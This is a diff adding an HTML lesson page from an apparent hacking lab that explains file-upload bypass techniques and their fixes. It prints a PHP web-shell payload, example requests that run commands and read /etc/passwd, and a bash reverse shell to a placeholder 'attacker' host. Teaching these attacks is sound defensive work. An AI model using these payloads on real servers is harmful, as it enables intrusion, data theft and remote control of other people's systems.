@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>File Upload Bypass — How It Works — BEHACKER</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{background:#0d0f14;color:#c9d1d9;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;padding:0}
+nav{background:#161b22;border-bottom:1px solid #30363d;padding:12px 24px;display:flex;align-items:center;gap:16px;position:sticky;top:0;z-index:100}
+.nav-brand{color:#c9d1d9;text-decoration:none;font-weight:700;font-size:1.1rem}
+.nav-back{color:#58a6ff;text-decoration:none;font-size:.9rem}
+.nav-back:hover{text-decoration:underline}
+main{max-width:860px;margin:0 auto;padding:40px 24px 80px}
+h1{font-size:2rem;font-weight:700;color:#e6edf3;margin-bottom:8px}
+.subtitle{color:#8b949e;font-size:.95rem;margin-bottom:40px}
+h2{font-size:1.3rem;font-weight:600;color:#e6edf3;margin:36px 0 12px;padding-bottom:6px;border-bottom:1px solid #30363d}
+h3{font-size:1.1rem;font-weight:600;color:#f8c555;margin:24px 0 10px}
+p{line-height:1.7;margin-bottom:14px;color:#c9d1d9}
+ul,ol{margin:0 0 16px 24px;line-height:1.8}
+li{margin-bottom:4px}
+li strong{color:#e6edf3}
+code{background:#161b22;border:1px solid #30363d;border-radius:4px;padding:2px 6px;font-family:'Courier New',monospace;font-size:.88rem;color:#f8c555}
+pre{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:20px;overflow-x:auto;margin:16px 0 24px}
+pre code{background:none;border:none;padding:0;color:#b5e8a0;font-size:.9rem}
+hr{border:none;border-top:1px solid #30363d;margin:32px 0}
+.back-btn{display:inline-block;margin-top:40px;padding:10px 20px;background:#238636;color:#fff;text-decoration:none;border-radius:6px;font-weight:600;font-size:.9rem}
+.back-btn:hover{background:#2ea043}
+strong{color:#e6edf3}
+em{color:#8b949e;font-style:italic}
+</style>
+</head>
+<body>
+<nav>
+  <a href="../../NAVIGATE.html" class="nav-brand">💀 BEHACKER</a>
+  <a href="index.html" class="nav-back">← Back to Lab</a>
+</nav>
+<main>
+<h1>File Upload Bypass — How It Works</h1>
+
+<h2>What the server checks (insufficient)</h2>
+
+<pre><code>1. File extension — only checks the last component after the final dot
+2. Content-Type header — set by the client, trivially spoofed</code></pre>
+
+<p>Neither check is reliable. Both are fully attacker-controlled.</p>
+
+<hr>
+
+<h2>Bypass techniques</h2>
+
+<h3>Double extension</h3>
+<pre><code>filename: shell.php.jpg</code></pre>
+<p>Server checks last extension (<code>.jpg</code>) → passes. Web server may still execute <code>.php</code> component depending on config (<code>AddHandler application/x-httpd-php .php</code> applies to any filename containing <code>.php</code>).</p>
+
+<h3>Null byte truncation (older PHP / CGI)</h3>
+<pre><code>filename: shell.php%00.jpg</code></pre>
+<p>Extension check sees <code>.jpg</code>. C string functions stop at the null byte → file stored as <code>shell.php</code>.</p>
+
+<h3>Alternative PHP extensions</h3>
+<pre><code>.php5  .php7  .phtml  .phar  .php.   (trailing dot on Windows)</code></pre>
+<p>Not in the blocked list but still executed by the PHP interpreter.</p>
+
+<h3>Case variation</h3>
+<pre><code>shell.pHp  shell.PHP  shell.PhP</code></pre>
+<p>Bypasses case-sensitive extension blocklists on Linux.</p>
+
+<h3>Content-Type spoofing</h3>
+<pre><code>POST /upload HTTP/1.1
+Content-Type: multipart/form-data
+
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: image/jpeg    ← attacker sets this freely
+
+&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+
+<hr>
+
+<h2>Impact after successful upload</h2>
+
+<pre><code># Execute OS commands
+GET /uploads/shell.php?cmd=id
+→ uid=33(www-data)
+
+# Read sensitive files
+GET /uploads/shell.php?cmd=cat+/etc/passwd
+
+# Reverse shell
+GET /uploads/shell.php?cmd=bash+-c+'bash+-i+&gt;%26+/dev/tcp/attacker/4444+0&gt;%261'</code></pre>
+
+<hr>
+
+<h2>The Fix</h2>
+
+<pre><code>1. Re-encode / re-process images server-side (PIL/Pillow, sharp)
+   — strips any embedded PHP from a "JPEG" and confirms it's a real image
+
+2. Store uploads OUTSIDE the web root
+   /var/uploads/  (not /var/www/uploads/)
+   Serve via a controller: GET /files/123 → stream from disk
+
+3. Rename files on upload — ignore the original filename entirely
+   uuid4() + .jpg  — no attacker-controlled extension
+
+4. Disable PHP execution in the uploads directory
+   # Nginx
+   location /uploads/ { location ~ \.php$ { deny all; } }
+
+5. Validate magic bytes — not just extension/MIME
+   JPEG: FF D8 FF
+   PNG:  89 50 4E 47</code></pre>
+
+<a href="index.html" class="back-btn">← Back to Lab</a>
+</main>
+</body>
+</html>
